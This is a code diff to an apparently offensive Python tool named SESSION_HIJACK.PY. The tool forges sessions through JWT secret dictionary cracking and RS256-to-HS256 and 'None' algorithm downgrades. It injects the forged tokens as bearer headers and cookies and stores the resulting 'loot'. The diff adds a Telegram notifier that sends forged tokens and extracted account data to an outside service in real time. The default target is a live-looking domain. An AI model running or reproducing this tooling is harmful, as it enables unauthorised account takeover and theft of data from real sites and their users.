@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-SESSION_HIJACK.PY — Advanced Session Forging & Privilege Escalation Module (Elite Edition)
+SESSION_HIJACK.PY — Advanced Session Forging & Privilege Escalation Module (Elite Edition with Telegram Telemetry)
 Features:
 - Multi-vector session injection (Bearer Auth headers + Cookie Jar session injection)
 - Cryptographic JWT secret dictionary cracking & algorithm downgrade attacks (RS256 -> HS256 & None)
 - Strict response schema validation (Zero false-positives: verifies JSON privilege objects, not static HTML text)
 - Differential content comparison against baseline unauthenticated responses
 - Automated immutable disk exfiltration of verified session loot (loot_output/)
+- Real-time asynchronous Telegram notification dispatch for unredacted session loot
 """
 import asyncio
 import sys
@@ -17,9 +18,10 @@ import hashlib
 import httpx
 from urllib.parse import urlsplit
 
-# Import centralized loot exfiltration and telemetry streaming
+# Import centralized loot exfiltration, telemetry streaming, and Telegram broadcaster
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 COMMON_SECRETS = [
     "secret", "password", "jwt_secret", "changeme", "admin123", 
@@ -41,6 +43,17 @@ def log(msg, color="GREEN"):
     ansi_color = COLORS.get(color, color)
     sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def base64url_encode(data):
     if isinstance(data, str):
@@ -150,7 +163,16 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                         if (status == 200 and not is_landing_shell) and (has_elevated_json or is_differential_match):
                             log(f"[!!!] GENUINE BREACH CONFIRMED AT {endpoint} USING {vector_name} [!!!]", "RED")
                             
-                            # STREAM LIVE TELEMETRY & PERSIST LOOT TO DISK IMMEDIATELY
+                            loot_payload = {
+                                "vector": vector_name,
+                                "endpoint": endpoint,
+                                "status": status,
+                                "forged_token": token,
+                                "extracted_data": extracted_json_data or body[:300]
+                            }
+
+                            # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
+                            broadcast_tg_alert_sync(f"Verified Session Hijack ({vector_name})", loot_payload)
                             stream_proof("SESSION_HIJACK_BREACH", endpoint, {"vector": vector_name, "token": token}, body, extracted_json_data or {"status": status})
                             save_session_loot(
                                 target=base_url,
@@ -159,7 +181,7 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                                 status=status,
                                 headers=dict(response.headers),
                                 body=body,
-                                extra_loot={"forged_token": token, "extracted_data": extracted_json_data}
+                                extra_loot=loot_payload
                             )
 
                             hijack_findings.append({
@@ -185,4 +207,3 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
     asyncio.run(run_session_hijack(target))
-
